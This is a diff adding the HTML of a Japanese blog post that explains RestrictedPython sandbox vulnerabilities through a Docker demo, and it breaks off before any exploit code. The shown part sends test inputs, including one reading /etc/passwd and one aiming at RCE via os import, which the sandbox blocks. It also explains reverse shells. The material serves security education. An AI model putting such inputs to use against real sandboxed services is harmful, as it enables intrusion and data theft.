@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>言語Sandbox環境の脆弱性とその真因の考察 - RestrictedPythonを題材に | 俺とお前とlaysakura</title>
+  
+  <link rel="canonical" href="https://laysakura.github.io/2024/12/17/RestrictedPython-CVE/"/>
+  <meta name="viewport" content="width=device-width">
+  <meta name="description" content="ご挨拶Python Advent Calendar 2024 の17日目の記事です。 JTCでセキュリティ・プライバシー・データ基盤領域の研究開発をしている @laysakura です。この記事で扱うのは、信頼できないユーザーから与えられたコードを実行するための「言語Sandbox環境」です。特に、Pythonの言語Sandbox環境であるRestrictedPythonを取り上げます。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="言語Sandbox環境の脆弱性とその真因の考察 - RestrictedPythonを題材に">
+<meta property="og:url" content="https://laysakura.github.io/2024/12/17/RestrictedPython-CVE/index.html">
+<meta property="og:site_name" content="俺とお前とlaysakura">
+<meta property="og:description" content="ご挨拶Python Advent Calendar 2024 の17日目の記事です。 JTCでセキュリティ・プライバシー・データ基盤領域の研究開発をしている @laysakura です。この記事で扱うのは、信頼できないユーザーから与えられたコードを実行するための「言語Sandbox環境」です。特に、Pythonの言語Sandbox環境であるRestrictedPythonを取り上げます。">
+<meta property="og:locale" content="ja_JP">
+<meta property="og:image" content="https://laysakura.github.io/img/2024/12-17/demo-capture.png">
+<meta property="og:image" content="https://laysakura.github.io/img/2024/12-17/demo-setup.svg">
+<meta property="og:image" content="https://laysakura.github.io/img/2024/12-17/random-import-os.png">
+<meta property="article:published_time" content="2024-12-16T15:00:00.000Z">
+<meta property="article:modified_time" content="2024-12-16T12:34:11.060Z">
+<meta property="article:author" content="Sho Nakatani a.k.a. laysakura">
+<meta property="article:tag" content="Python">
+<meta property="article:tag" content="セキュリティ">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://laysakura.github.io/img/2024/12-17/demo-capture.png">
+
+  <!-- favicon -->
+  <link rel="apple-touch-icon" sizes="180x180" href="/favicon/apple-touch-icon.png">
+  <link rel="icon" href="/favicon/favicon.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon/favicon-16x16.png">
+  <link rel="manifest" href="/favicon/site.webmanifest">
+  <link rel="mask-icon" href="/favicon/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+<script type="text/javascript">
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-22289437-2']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+</script>
+
+
+  <!-- MathJax -->
+  <script type="text/javascript" id="MathJax-script" async
+    src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
+  </script
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body>
+  <div id="container">
+    <div class="mobile-nav-panel">
+	<i class="icon-reorder icon-large"></i>
+</div>
+<header id="header">
+	<h1 class="blog-title">
+		<a href="/">俺とお前とlaysakura</a>
+	</h1>
+	<nav class="nav">
+		<ul>
+			<li><a href="/archives">過去の投稿</a></li>
+			<li><a id="nav-search-btn" class="nav-icon" title="Search"></a></li>
+			<li><a target="_blank" rel="noopener" href="http://cloud.feedly.com/#subscription%2Ffeed%2Fhttps%3A%2F%2Flaysakura.github.io%2Fatom.xml" id="nav-rss-link" class="nav-icon" title="RSS Feed"></a></li>
+		</ul>
+	</nav>
+	<div id="search-form-wrap">
+		<form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://laysakura.github.io"></form>
+	</div>
+</header>
+    <div id="main">
+      <article id="post-言語Sandbox環境の脆弱性とその真因の考察" class="post">
+  <footer class="entry-meta-header">
+    <span class="meta-elements date">
+      <a href="/2024/12/17/RestrictedPython-CVE/" class="article-date">
+  <time datetime="2024-12-16T15:00:00.000Z" itemprop="datePublished">2024-12-17</time>
+</a>
+    </span>
+  </footer>
+  
+  <header class="entry-header">
+    
+  
+    <h1 class="article-title entry-title" itemprop="name">
+      言語Sandbox環境の脆弱性とその真因の考察 - RestrictedPythonを題材に
+    </h1>
+  
+
+  </header>
+  <div class="entry-content">
+    
+    <img src="/img/2024/12-17/demo-capture.png" alt="CVE-2023-41039によるRevshell獲得のスクショ" width="auto" height="auto">
+
+<h2><span id="ご挨拶">ご挨拶</span></h2><p><a target="_blank" rel="noopener" href="https://qiita.com/advent-calendar/2024/python">Python Advent Calendar 2024</a> の17日目の記事です。</p>
+<p>JTCでセキュリティ・プライバシー・データ基盤領域の研究開発をしている <a target="_blank" rel="noopener" href="https://x.com/laysakura">@laysakura</a> です。<br>この記事で扱うのは、信頼できないユーザーから与えられたコードを実行するための「言語Sandbox環境」です。特に、Pythonの言語Sandbox環境であるRestrictedPythonを取り上げます。</p>
+<div style="text-align: center">
+  <div class="github-card" data-user="zopefoundation" data-repo="RestrictedPython" data-height="200" data-width="400" data-theme="default" data-target data-client-id data-client-secret></div>
+</div>
+<script src="/github-card-lib/githubcard.js"></script>
+
+
+<p>言語Sandbox環境の理念は素晴らしく、応用先も色々と考えられるものですが、初手の設計を誤ると攻撃者とのいたちごっこになってしまうということをこの記事を通してお伝えできればと思います。</p>
+<p>それではお楽しみください（ここからは常体で失礼します）。</p>
+<span id="more"></span>
+
+<h2><span id="目次">目次</span></h2><!-- toc -->
+
+<ul>
+<li><a href="#%E5%B0%8E%E5%85%A5">導入</a></li>
+<li><a href="#%E7%94%A8%E8%AA%9E">用語</a></li>
+<li><a href="#%E3%83%87%E3%83%A2%E7%92%B0%E5%A2%83%E3%82%BB%E3%83%83%E3%83%88%E3%82%A2%E3%83%83%E3%83%97">デモ環境セットアップ</a><ul>
+<li><a href="#%E6%A7%8B%E6%88%90%E5%9B%B3">構成図</a></li>
+<li><a href="#%E3%82%B5%E3%83%BC%E3%83%90%E3%83%BC%E8%B5%B7%E5%8B%95%E5%8B%95%E4%BD%9C%E7%A2%BA%E8%AA%8D">サーバー起動〜動作確認</a></li>
+<li><a href="#%E5%8D%B1%E9%99%BA%E3%81%AA%E3%82%B3%E3%83%BC%E3%83%89%E3%81%AF%E5%AE%9F%E8%A1%8C%E3%81%A7%E3%81%8D%E3%81%AA%E3%81%84">「危険」なコードは実行できない</a></li>
+</ul>
+</li>
+<li><a href="#restrictedpython%E3%81%AE%E4%BD%BF%E3%81%84%E6%96%B9%E5%8B%95%E4%BD%9C%E5%8E%9F%E7%90%86">RestrictedPythonの使い方・動作原理</a><ul>
+<li><a href="#%E4%BD%BF%E3%81%84%E6%96%B9">使い方</a></li>
+<li><a href="#%E5%8B%95%E4%BD%9C%E5%8E%9F%E7%90%86">動作原理</a><ul>
+<li><a href="#%E5%8B%95%E4%BD%9C%E5%8E%9F%E7%90%86%E3%82%92%E5%8B%95%E7%9A%84%E3%81%AB%E7%A2%BA%E8%AA%8D">動作原理を動的に確認</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#restrictedpython%E3%81%AEcve">RestrictedPythonのCVE</a><ul>
+<li><a href="#cve-2023-37271-%E3%82%B8%E3%82%A7%E3%83%8D%E3%83%AC%E3%83%BC%E3%82%BF%E3%83%BC%E3%82%AA%E3%83%96%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88%E3%81%8B%E3%82%89%E3%82%B9%E3%82%BF%E3%83%83%E3%82%AF%E3%83%95%E3%83%AC%E3%83%BC%E3%83%A0%E3%82%92%E9%81%A1%E4%B8%8A%E3%81%99%E3%82%8B%E3%81%93%E3%81%A8%E3%81%AB%E3%82%88%E3%82%8Bsandbox-escape%E7%AD%86%E8%80%85%E5%91%BD%E5%90%8D">CVE-2023-37271: ジェネレーターオブジェクトからスタックフレームを遡上することによるsandbox escape（筆者命名）</a><ul>
+<li><a href="#%E5%8E%9F%E7%90%86">原理</a></li>
+<li><a href="#poc%E3%82%B3%E3%83%BC%E3%83%89">PoCコード</a></li>
+<li><a href="#%E3%83%87%E3%83%A2%E5%8B%95%E7%94%BB%E3%81%A8poc%E5%AE%9F%E8%A1%8C%E6%89%8B%E9%A0%86">デモ動画とPoC実行手順</a></li>
+</ul>
+</li>
+<li><a href="#cve-2023-41039-stringformatter-%E3%81%AE%E6%9B%B8%E5%BC%8F%E6%96%87%E5%AD%97%E5%88%97%E5%86%85%E3%81%A7%E3%81%AE%E3%82%A2%E3%83%88%E3%83%AA%E3%83%93%E3%83%A5%E3%83%BC%E3%83%88%E3%82%A2%E3%82%AF%E3%82%BB%E3%82%B9%E3%81%AE%E3%82%B5%E3%83%8B%E3%82%BF%E3%82%A4%E3%82%BA%E6%BC%8F%E3%82%8C%E7%AD%86%E8%80%85%E5%91%BD%E5%90%8D">CVE-2023-41039: string.Formatter() の書式文字列内でのアトリビュートアクセスのサニタイズ漏れ（筆者命名）</a><ul>
+<li><a href="#%E5%8E%9F%E7%90%86-1">原理</a></li>
+<li><a href="#poc%E3%82%B3%E3%83%BC%E3%83%89-1">PoCコード</a></li>
+<li><a href="#%E3%83%87%E3%83%A2%E5%8B%95%E7%94%BB%E3%81%A8poc%E5%AE%9F%E8%A1%8C%E6%89%8B%E9%A0%86-1">デモ動画とPoC実行手順</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#takeaway">Takeaway</a><ul>
+<li><a href="#%E4%BD%95%E3%81%8C%E8%B5%B7%E3%81%8D%E3%81%A6%E3%81%84%E3%81%9F%E3%81%8B">何が起きていたか？</a></li>
+<li><a href="#%E6%9B%B4%E3%81%AB%E6%AD%B4%E5%8F%B2%E3%81%AB%E5%AD%A6%E3%81%B6">更に歴史に学ぶ</a></li>
+<li><a href="#restrictedpython%E3%81%AE%E8%84%86%E5%BC%B1%E6%80%A7%E3%81%AF%E5%87%BA%E5%B0%BD%E3%81%8F%E3%81%97%E3%81%9F%E3%81%8B">RestrictedPythonの脆弱性は出尽くしたか？</a></li>
+<li><a href="#%E3%82%BB%E3%82%AD%E3%83%A5%E3%82%A2%E3%81%AA%E8%A8%80%E8%AA%9Esandbox%E3%81%AE%E4%BD%9C%E3%82%8A%E6%96%B9%E3%81%AB%E9%96%A2%E3%81%99%E3%82%8B%E7%B7%8F%E6%8B%AC">セキュアな言語Sandboxの作り方に関する総括</a></li>
+</ul>
+</li>
+</ul>
+<!-- tocstop -->
+
+<h2><span id="導入">導入</span></h2><p>「◯◯言語を安全に動作させる環境」のことを、言語Sandbox環境と呼ぶこととする。その言語が本来持つ、例えばファイルアクセスやコマンド呼び出しのような機能を「危険な機能」として使えないようにしたものが言語Sandbox環境の典型的な姿である。</p>
+<p>Pythonの言語Sandbox環境として、RestrictedPythonというものがある。</p>
+<div style="text-align: center">
+  <div class="github-card" data-user="zopefoundation" data-repo="RestrictedPython" data-height="200" data-width="400" data-theme="default" data-target data-client-id data-client-secret></div>
+</div>
+<script src="/github-card-lib/githubcard.js"></script>
+
+
+<p>本稿では、RestrictedPythonを言語Sandbox環境の例として取り上げる。RestrictedPythonで報告されたCVEの詳説・デモを通じ、言語Sandbox環境に脆弱性をもたらす真因を考察する。</p>
+<p>込み入った話も多いが、時間のない方は是非最後のTakeawayだけでも読んでいただくことを願う。</p>
+<h2><span id="用語">用語</span></h2><ul>
+<li><strong>Sandbox環境</strong><ul>
+<li>ホスト環境と隔離された環境。Sandbox環境で実行したプログラムは、Sandbox環境のみを環境（入力）とし、Sandbox環境にのみ影響を与えるのが理想とされる</li>
+</ul>
+</li>
+<li><strong>Sandbox bypass</strong>; Jailbreak<ul>
+<li>Sandbox環境で実行される悪意のあるプログラムにより、Sandbox環境外部（ホスト環境）と入出力すること</li>
+</ul>
+</li>
+<li><strong>CVE</strong> (Common Vulnerabilities and Exposures)<ul>
+<li>個別製品の脆弱性に割り当てられる識別子</li>
+</ul>
+</li>
+<li><strong>PoC</strong> (Proof of Concept)<ul>
+<li>CVEの文脈では、CVEを突いた攻撃のコード</li>
+</ul>
+</li>
+<li><strong>RCE</strong> (Remote Code Execution)<ul>
+<li>攻撃（脆弱性の悪用）カテゴリの一つ</li>
+<li>攻撃対象プロセスを実行するリモートマシンで、攻撃対象プロセスの実行ユーザーとして任意のコードを実行できるもの<ul>
+<li>攻撃カテゴリの中で影響は最大レベル</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Reverse-shell</strong><ul>
+<li>RCEを応用した典型的な攻撃。攻撃者がサーバーのシェルアクセスを得る</li>
+<li>通常のsshなどでは「クライアントからサーバーに接続し、サーバーのシェルを得る」方向だが、reverse-shellは逆に「サーバーからクライアントに接続し、サーバーのシェルをクライアントに明け渡す」方向</li>
+<li>Reverse-shellの（攻撃者にとっての）利点:<ul>
+<li>RCEが成立していれば、サーバー側にさらなるポート開放を求めずに済む</li>
+<li>サーバー側の侵入検知システム等ではincoming通信には厳しくoutbound通信には相対的に緩いことが多く、サーバーからのoutboundで成立する攻撃は成功率が比較的高い</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2><span id="デモ環境セットアップ">デモ環境セットアップ</span></h2><p>RestrictedPython のCVEを再現するためのdockerイメージ（上述の「設定」も含む）を <a target="_blank" rel="noopener" href="https://github.com/laysakura/RestrictedPython-CVE-PoC">https://github.com/laysakura/RestrictedPython-CVE-PoC</a> に用意した。</p>
+<div style="text-align: center">
+  <div class="github-card" data-user="laysakura" data-repo="RestrictedPython-CVE-PoC" data-height="200" data-width="400" data-theme="default" data-target data-client-id data-client-secret></div>
+</div>
+<script src="/github-card-lib/githubcard.js"></script>
+
+
+<h3><span id="構成図">構成図</span></h3><img src="/img/2024/12-17/demo-setup.svg" alt="デモ構成図" width="800px" height="auto">
+
+<p>各自の「ホストマシン」において、Dockerコンテナを立てる。「ホストマシン」がクライアント、Dockerコンテナがサーバーとなる。<br>サーバーのTCP 6000番ポートをホストマシンの6000番とマッピングしているため、 <code>localhost 6000</code> にてサーバーと通信できる。</p>
+<h3><span id="サーバー起動動作確認">サーバー起動〜動作確認</span></h3><p><strong>ホストマシンでのコマンド</strong></p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">clone</span> &amp; <span class="built_in">cd</span></span></span><br><span class="line">git clone https://github.com/laysakura/RestrictedPython-CVE-PoC.git</span><br><span class="line">cd RestrictedPython-CVE-PoC</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Docker build</span></span><br><span class="line">docker build -t restricted-python .</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Docker run</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># インタラクティブモードでデフォルトCMD (bash) を起動</span></span></span><br><span class="line">docker run -it -p 6000:6000 restricted-python</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>コンテナ内でのコマンド</strong></p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Python実行サーバー起動</span></span><br><span class="line">./run-server.sh</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>ホストマシンでのコマンド</strong></p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd RestrictedPython-CVE-PoC</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">フィボナッチ数列を計算するプログラムをサーバーに投入し、結果を得る</span></span><br><span class="line"><span class="meta prompt_">% </span><span class="language-bash">nc localhost 6000 &lt; ./example/fib.py</span></span><br><span class="line">Hello from python sandbox server!</span><br><span class="line">Your `run` function is executed by me with RestrictedPython, and you&#x27;ll get the `return` value.</span><br><span class="line">Enter Python code to execute:</span><br><span class="line">Return value: 55</span><br></pre></td></tr></table></figure>
+
+<h3><span id="危険なコードは実行できない">「危険」なコードは実行できない</span></h3><p>フィボナッチ数列は計算できたが、次のような「危険」な（サーバーの情報を漏洩したりRCEにつながるような）コードはエラーとなることを確認する。</p>
+<p><strong>ホストマシンでのコマンド</strong></p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">cd RestrictedPython-CVE-PoC</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">`open()` 関数を使ったプログラムwサーバーに投入するとエラー</span></span><br><span class="line"><span class="meta prompt_">% </span><span class="language-bash">nc localhost 6000 &lt; ./example/open_to_info_leak.py</span></span><br><span class="line">Hello from python sandbox server!</span><br><span class="line">Your `run` function is executed by me with RestrictedPython, and you&#x27;ll get the `return` value.</span><br><span class="line">Enter Python code to execute:</span><br><span class="line">Error executing the client code:</span><br><span class="line">name &#x27;open&#x27; is not defined</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">`import` も使えない</span></span><br><span class="line"><span class="meta prompt_">% </span><span class="language-bash">nc localhost 6000 &lt; ./example/import_os_to_rce.py</span></span><br><span class="line">Hello from python sandbox server!</span><br><span class="line">Your `run` function is executed by me with RestrictedPython, and you&#x27;ll get the `return` value.</span><br><span class="line">Enter Python code to execute:</span><br><span class="line">Error executing the client code:</span><br><span class="line">Import is prohibited by the policy</span><br></pre></td></tr></table></figure>
+
+<h2><span id="restrictedpythonの使い方動作原理">RestrictedPythonの使い方・動作原理</span></h2><h3><span id="使い方">使い方</span></h3><p>RestrictedPythonを使ったsandbox環境の設定例を、 <a target="_blank" rel="noopener" href="https://github.com/laysakura/RestrictedPython-CVE-PoC/blob/main/restricted_python_cve/run_server.py">restricted_python_cve&#x2F;run_server.py</a> から、抜粋。<br>続く小節で説明をするのでまずは流し読みで良い。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">execute_restricted_code</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    受け取ったコードをRestrictedPythonによりsandbox実行し、結果を返す</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        code (str): 実行するPythonコード。 `def run():` を含むこと</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        any: run関数の実行結果</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    byte_code = compile_restricted(code, filename=<span class="string">&quot;&lt;client code&gt;&quot;</span>, mode=<span class="string">&quot;exec&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># byte_code 実行環境（sandbox環境）のグローバル関数・変数（以下、グローバル）を設定。</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># グローバルなしだと、例えば `.` (`getattr`) も使えず、実行できるコードがあまりにも制約される。</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># 一方でこの環境のグローバル関数・変数を引き継ぐと、それを通したsandbox-escapeに繋がるので、</span></span><br><span class="line">    <span class="comment"># RestrictedPython定義も借りて安全なグローバル関数・変数を設定する。</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># なお、この辺の設定ベストプラクティスは公式ドキュメントを見てもわからないので、</span></span><br><span class="line">    <span class="comment"># UIUCTF23 の問題コードから拝借した: https://github.com/nikosChalk/ctf-writeups/blob/master/uiuctf23/pyjail/rattler-read/writeup/README.md#jail-analysis</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">no_import</span>(<span class="params">name, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">raise</span> ImportError(<span class="string">&quot;Import is prohibited by the policy&quot;</span>)</span><br><span class="line"></span><br><span class="line">    policy_globals = &#123;**safe_globals, **utility_builtins&#125;</span><br><span class="line">    policy_globals[<span class="string">&quot;__builtins__&quot;</span>][<span class="string">&quot;__metaclass__&quot;</span>] = <span class="built_in">type</span></span><br><span class="line">    policy_globals[<span class="string">&quot;__builtins__&quot;</span>][<span class="string">&quot;__name__&quot;</span>] = <span class="built_in">type</span></span><br><span class="line">    policy_globals[<span class="string">&quot;__builtins__&quot;</span>][<span class="string">&quot;__import__&quot;</span>] = no_import</span><br><span class="line">    policy_globals[<span class="string">&quot;_getattr_&quot;</span>] = Guards.safer_getattr</span><br><span class="line">    policy_globals[<span class="string">&quot;_getiter_&quot;</span>] = Eval.default_guarded_getiter</span><br><span class="line">    policy_globals[<span class="string">&quot;_getitem_&quot;</span>] = Eval.default_guarded_getitem</span><br><span class="line">    policy_globals[<span class="string">&quot;_write_&quot;</span>] = Guards.full_write_guard</span><br><span class="line">    policy_globals[<span class="string">&quot;_iter_unpack_sequence_&quot;</span>] = Guards.guarded_iter_unpack_sequence</span><br><span class="line">    policy_globals[<span class="string">&quot;_unpack_sequence_&quot;</span>] = Guards.guarded_unpack_sequence</span><br><span class="line">    policy_globals[<span class="string">&quot;enumerate&quot;</span>] = <span class="built_in">enumerate</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 安全なglobalを設定した上で、byte_codeを実行。</span></span><br><span class="line">    <span class="comment"># 実行した結果としての関数定義は `my_locals` に格納する。</span></span><br><span class="line">    my_locals = &#123;&#125;</span><br><span class="line">    <span class="built_in">exec</span>(byte_code, policy_globals, my_locals)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Code executed successfully&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;run&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> my_locals:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;No `run` function defined in the code&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> my_locals[<span class="string">&quot;run&quot;</span>]()</span><br></pre></td></tr></table></figure>
+
+<h3><span id="動作原理">動作原理</span></h3><p>何が起きているかを解説する。適宜 <a target="_blank" rel="noopener" href="https://restrictedpython.readthedocs.io/">公式ドキュメント</a> も参照のこと。</p>
+<ol>
+<li><code>compile_restricted()</code> により、 <code>code</code> （クライアントから与えられたPythonプログラム文字列）をトランスパイル（コンパイルよりも単純な、プログラム文字列から別のプログラム文字列への変換）し、その後Pythonのバイトコードに変換<ul>
+<li>トランスパイルの内容:<ul>
+<li>危険なメソッド呼び出しを、独自のメソッド呼び出しに変換（一例）:<ul>
+<li><code>a.b</code> → <code>_getattr_(a, &#39;b&#39;)</code></li>
+<li><code>getattr(a, &#39;b&#39;)</code> → <code>_getattr_(a, &#39;b&#39;)</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>バイトコードというのは .pyc の中身と同じもの</li>
+</ul>
+</li>
+<li>バイトコードを実行する環境として、グローバル関数・変数（以下、グローバル）を設定<ul>
+<li>例1: <code>policy_globals = &#123;**safe_globals,**utility_builtins&#125;</code> により、標準的なPythonよりも限られたグローバルを設定</li>
+<li>例2: <code>policy_globals[&quot;__builtins__&quot;][&quot;__import__&quot;] = no_import</code> により、 <code>import</code> 呼び出し時に例外が発生するようにしている</li>
+<li>例3: <code>policy_globals[&quot;_getattr_&quot;] = Guards.safer_getattr</code> の行により、Python標準の <code>getattr</code> ではなくRestrictedPythonの <code>safer_getattr</code> をグローバルに設定している<ul>
+<li><code>safer_getattr</code> は <code>_</code> で始まるアトリビュート（<code>__init__</code> など）へのアクセスを禁止し、攻撃者が言語機能を利用する余地を低減している</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>exec</code> 関数（これはRestrictedPythonではなくPython標準の関数）に、バイトコードと上述の設定済みグローバルを与える</li>
+<li><code>exec</code> に設定した my_locals に、バイトコード実行の結果セットされたローカル関数・変数が格納される<ul>
+<li>それによりローカル関数としてセットされた <code>run()</code> 関数を実行（クライアントに <code>run()</code> 関数を書いてもらう制約あり）</li>
+</ul>
+</li>
+</ol>
+<h4><span id="動作原理を動的に確認">動作原理を動的に確認</span></h4><p>上記で実行した <code>./example/open_to_info_leak.py</code> を改めて確認する。</p>
+<p><strong>コンテナ内でのコマンド</strong></p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Python実行サーバー起動</span></span><br><span class="line">./run-server.sh</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>ホストマシンでのコマンド</strong></p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">`open(<span class="string">&quot;/etc/passwd&quot;</span>).<span class="built_in">read</span>()` するプログラムをサーバーに投入し、結果を得ようとする</span></span><br><span class="line"><span class="meta prompt_">% </span><span class="language-bash">nc localhost 6000 &lt; ./example/open_to_info_leak.py</span></span><br><span class="line">Hello from python sandbox server!</span><br><span class="line">Your `run` function is executed by me with RestrictedPython, and you&#x27;ll get the `return` value.</span><br><span class="line">Enter Python code to execute:</span><br><span class="line">Error executing the client code:</span><br><span class="line">name &#x27;open&#x27; is not defined</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><code>open()</code> はPython標準のビルトイン関数であるが、 <code>policy_globals = &#123;**safe_globals,**utility_builtins&#125;</code> の行において <code>&quot;open&quot;</code> が <code>policy_globals</code> dictのキーにセットされないため、sandbox環境 ( <code>exec()</code> 内) におけるグローバルとして <code>open</code> は存在せずエラーとなっている。</p>
+<h2><span id="restrictedpythonのcve">RestrictedPythonのCVE</span></h2><p>RestrictedPythonに関する脆弱性は <a target="_blank" rel="noopener" href="https://github.com/zopefoundation/RestrictedPython/security">https://github.com/zopefoundation/RestrictedPython/security</a> にて情報開示されている3つである。</p>
+<p>そのうち Severity (重大度) が High である、下記2点について詳説する。</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/zopefoundation/RestrictedPython/security/advisories/GHSA-wqc8-x2pr-7jqh">Arbitrary code execution via stack frame sandbox escape (CVE-2023-37271)</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/zopefoundation/RestrictedPython/security/advisories/GHSA-xjw2-6jm9-rf67">Sandbox escape via various forms of “format”. (CVE-2023-41039)</a></li>
+</ul>
+<p>この2つはどちらもRCE攻撃が可能である。</p>
+<h3><span id="cve-2023-37271-ジェネレーターオブジェクトからスタックフレームを遡上することによるsandbox-escape筆者命名">CVE-2023-37271: ジェネレーターオブジェクトからスタックフレームを遡上することによるsandbox escape（筆者命名）</span></h3><h4><span id="原理">原理</span></h4><p>Pythonインタプリタはスタックフレームを持つ。例外等が発生した場合にも表示される。<br>スタックフレーム中の各要素は、その関数呼び出し時点での環境情報を内包する。環境情報にはグローバル空間のビルトイン関数なども含まれる。</p>
